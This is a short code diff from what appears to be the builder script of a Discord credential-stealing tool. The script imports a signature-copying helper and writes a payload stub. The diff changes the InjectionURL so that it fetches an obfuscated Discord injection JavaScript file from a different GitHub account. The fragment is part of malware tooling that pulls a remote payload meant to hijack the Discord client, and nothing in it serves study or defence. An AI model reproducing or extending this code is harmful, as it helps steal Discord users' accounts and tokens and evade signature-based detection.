@@ -17,7 +17,7 @@ from sigthief import outputCert
 SettingsFile = "config.json"
 InCodeFile = "stub.py"
 OutCodeFile = "stub-o.py"
-InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js"
+InjectionURL = "https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js"
 
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('__name__ == "__main__" and ', '')
